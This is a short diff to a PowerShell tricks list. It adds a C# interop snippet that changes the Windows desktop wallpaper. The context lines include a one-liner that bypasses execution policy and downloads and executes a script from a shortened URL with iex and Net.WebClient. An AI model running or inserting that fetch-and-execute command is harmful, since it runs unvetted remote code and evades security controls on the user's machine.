@@ -32,6 +32,24 @@ Get-Content .runme.ps1 | PowerShell.exe -noprofile -
 => Executing PS remotly bypassing ExecutionPolicy
 powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
 
+=> Changing Wallpaper
+$setwallpapersrc = @"
+using System.Runtime.InteropServices;
+public class wallpaper
+{
+public const int SetDesktopWallpaper = 20;
+public const int UpdateIniFile = 0x01;
+public const int SendWinIniChange = 0x02;
+[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
+public static void SetWallpaper ( string path )
+{
+SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
+}
+}
+"@
+Add-Type -TypeDefinition $setwallpapersrc
+[wallpaper]::SetWallpaper("h:\Quotefancy-1542-3840x2160.jpg") 
 
 
 ============
